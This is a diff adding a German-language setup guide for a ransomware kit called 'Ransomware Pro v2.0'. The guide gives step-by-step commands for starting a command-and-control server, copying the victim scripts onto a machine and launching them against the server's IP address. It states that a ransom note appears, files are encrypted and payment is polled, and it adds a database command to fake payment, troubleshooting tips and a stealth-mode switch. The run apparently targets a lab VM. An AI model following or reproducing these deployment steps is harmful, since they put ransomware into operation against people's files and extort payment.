@@ -1,0 +1,65 @@
+RANSOMWARE PRO v2.0 - SIMPLE SETUP GUIDE
+==========================================
+
+SCHRITT 1: HOST PC (192.168.126.200)
+====================================
+
+cd D:\ransomware_pro
+python c2_server.py
+
+Der Server läuft jetzt auf http://192.168.126.200:5000
+
+
+SCHRITT 2: VICTIM VM
+====================
+
+Kopiere diese Dateien auf die VM (z.B. in C:\Downloads):
+  - standalone_victim.py
+  - auto_launcher.py
+  - run.bat
+
+Dann öffne CMD / PowerShell und führe aus:
+
+cd C:\Downloads
+python auto_launcher.py 192.168.126.200
+
+ODER einfach:
+
+run.bat 192.168.126.200
+
+
+SCHRITT 3: RANSOMWARE LÄUFT!
+=============================
+
+- Ransom Note sollte auf dem Desktop angezeigt werden
+- Dateien werden verschlüsselt
+- Verbindung zum C2 Server wird hergestellt
+- Zahlung wird alle 30 Sekunden überwacht
+
+
+SCHRITT 4: ZAHLUNG SIMULIEREN (TESTING)
+=========================================
+
+Öffne auf dem HOST PC eine neue CMD:
+
+sqlite3 C:\ransomware\victims.db
+UPDATE victims SET payment_received=1, status='PAID' WHERE victim_id LIKE 'first%';
+.exit
+
+Ransomware sollte automatisch entschlüsseln!
+
+
+FEHLERBEHANDLUNG
+================
+
+Falls BAT Fehler hat: Nutze direkt Python
+  python auto_launcher.py 192.168.126.200
+
+Falls "Python nicht gefunden": Installiere Python von python.org
+  - Wichtig: "Add Python to PATH" ankreuzen!
+
+Falls keine Verbindung zum C2: Firewall Port 5000 freigeben
+  - Oder lokal testen: python auto_launcher.py 127.0.0.1
+
+Logs ansehen (in der Ransomware):
+  STEALTH_MODE=false python auto_launcher.py 192.168.126.200
